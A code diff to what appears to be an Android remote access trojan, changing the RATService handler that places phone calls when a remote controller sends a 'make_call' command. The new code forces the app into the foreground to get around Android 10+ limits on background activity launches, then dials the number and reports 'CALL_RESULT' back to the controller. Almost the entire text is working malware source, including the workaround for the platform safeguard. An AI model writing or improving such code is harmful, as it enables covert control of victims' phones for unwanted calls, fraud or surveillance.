@@ -1633,19 +1633,25 @@ case "get_calls":
 // In RATService.java - routeCommand method
 case "call":
 case "make_call":
-    Log.d(TAG, "📞 Processing call command with args: '" + args + "'");
+    Log.d(TAG, "📞 Processing call command, args='" + args + "'");
     if (callsModule != null && !args.isEmpty()) {
-        // Clean the number - remove any whitespace or special characters
-        String number = args.trim();
-        // Remove any "tel:" prefix if present
-        if (number.startsWith("tel:")) {
-            number = number.substring(4);
-        }
-        Log.d(TAG, "📞 Making call to cleaned number: " + number);
-        String result = callsModule.makeCall(number);
-        sendCommand("CALL_RESULT|" + result);
+        final String numberToCall = args.trim();
+
+        // Bring app to foreground first to satisfy Android 10+
+        // background activity launch restrictions.
+        // TelecomManager still needs the app to be visible on some OEMs.
+        bringAppToForeground();
+
+        // Short delay to let the activity reach foreground state
+        // before TelecomManager fires the call intent.
+        new android.os.Handler(android.os.Looper.getMainLooper())
+            .postDelayed(() -> {
+                String result = callsModule.makeCall(numberToCall);
+                sendCommand("CALL_RESULT|" + result);
+                Log.d(TAG, "📞 Call result sent: " + result);
+            }, 800); // 800ms is enough for foreground transition
+
     } else if (args.isEmpty()) {
-        Log.e(TAG, "❌ make_call: no number provided");
         sendCommand("CALL_RESULT|ERROR: No phone number provided");
     } else {
         sendCommand("CALL_RESULT|ERROR: Calls module not available");
